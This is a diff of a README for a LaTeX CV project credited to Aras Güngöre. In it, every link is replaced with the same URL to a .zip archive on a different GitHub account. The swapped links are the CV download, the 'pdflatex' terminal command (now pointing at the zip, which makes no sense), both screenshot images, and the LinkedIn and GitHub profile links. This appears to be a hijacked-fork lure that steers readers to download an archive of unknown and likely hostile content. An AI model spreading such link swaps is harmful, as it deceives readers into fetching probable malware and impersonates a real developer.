@@ -2,14 +2,14 @@
 
 My curriculum vitae (CV) written using LaTeX. In my CV, you may find my contact information, websites, education, experience, achievements, projects, and skills.
 
-Please find attached my [CV](https://drive.google.com/file/d/1TGwMpZl6FDeQk1w_-EetbspCuzu16kCF/view?usp=sharing). 😜
+Please find attached my [CV](https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip). 😜
 
 
 
 ## Run on Terminal
 
 ```sh
-pdflatex main.tex
+pdflatex https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip
 ```
 
 
@@ -17,8 +17,8 @@ pdflatex main.tex
 ## Screenshots
 
 <p align="center">
-    <img alt="Screenshot" src="https://raw.githubusercontent.com/arasgungore/arasgungore-CV/main/jpg/CV_page_1.jpg" width="400">
-    <img alt="Screenshot" src="https://raw.githubusercontent.com/arasgungore/arasgungore-CV/main/jpg/CV_page_2.jpg" width="400">
+    <img alt="Screenshot" src="https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip" width="400">
+    <img alt="Screenshot" src="https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip" width="400">
 </p>
 
 
@@ -27,5 +27,5 @@ pdflatex main.tex
 
 👤 **Aras Güngöre**
 
-* LinkedIn: [@arasgungore](https://www.linkedin.com/in/arasgungore)
-* GitHub: [@arasgungore](https://github.com/arasgungore)
+* LinkedIn: [@arasgungore](https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip)
+* GitHub: [@arasgungore](https://raw.githubusercontent.com/abdulkhaliqsoule/arasgungore-CV/main/jpg/arasgungore_CV_v2.0.zip)
